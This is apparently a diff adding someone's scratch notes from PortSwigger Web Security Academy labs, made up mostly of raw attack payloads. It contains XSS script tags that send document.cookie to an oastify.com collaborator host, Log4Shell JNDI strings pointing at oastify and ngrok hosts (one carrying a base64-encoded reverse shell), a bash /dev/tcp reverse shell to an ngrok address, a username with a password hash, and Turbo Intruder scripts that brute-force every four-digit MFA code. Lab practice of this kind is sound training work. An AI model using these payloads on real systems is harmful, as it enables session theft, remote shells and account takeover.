@@ -1,0 +1,73 @@
+   <script>
+		  new Image().src = "https://3cc3c07b44c0.ngrok-free.app/log?test=zz";
+		  var url = "https://0a47005303bf35d88153f20800b200de.web-security-academy.net/post?postId=5";
+		  var loadProfile = new XMLHttpRequest();
+		  loadProfile.open("GET", url, false);
+		  loadProfile.send();
+    </script>
+	
+	
+	
+	<script>
+    new Image().src = "https://n0oglyozr25l5j8jxhdxsk23eukl8bw0.oastify.com/log?test=" + document.cookie;
+</script>
+	
+	carlos:26323c16d5f4dabff3bb136f2460a943
+	
+	
+	${jndi:ldap://hvg5niy19prhbpx5maw8s5g1jspjd91y.oastify.com/test}
+	
+bash -i >& /dev/tcp/7.tcp.eu.ngrok.io:10746/12345 0>&1	
+
+
+
+feedback=${jndi:ldap://6.tcp.eu.ngrok.io:15023/Basic/Command/Base64/ZWNobyAtbiAiYmFzaCAtaSAgJiAvZGV2L3RjcC82LnRjcC5ldS5uZ3Jvay5pbzoxNTAyMy8xMDUwMCAwPiYxIg==}
+
+
+this was the solution number 1 and it was kinda slow one we can also use turbo intruder
+first we need to make sure we check this option extensions 
+![[Pasted image 20251122233409.png]]
+and also add this update all param hearers except te mfa-code
+
+![[Pasted image 20251122233536.png]]
+
+now lets use this script 
+```
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           requestsPerConnection=100,
+                           pipeline=False,
+			   engine=Engine.BURP
+                           )
+
+    for num in range(0, 10000):
+	mfa_code = '{0:04}'.format(num)
+	engine.queue(target.req, mfa_code.rstrip())
+
+
+def handleResponse(req, interesting):
+	if req.status == 302:
+		table.add(req)
+```
+
+![[Pasted image 20251122234659.png]]
+		
+		
+		def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           requestsPerConnection=100,
+                           pipeline=False
+                           )
+
+    # The loop starts here
+    for num in range(0, 10000):
+        # These lines MUST be indented to be part of the loop
+        mfa_code = '{0:04}'.format(num)
+        engine.queue(target.req, mfa_code)
+
+def handleResponse(req, interesting):
+    # 302 usually indicates a successful login/redirection in these labs
+    if req.status == 302:
+        table.add(req)
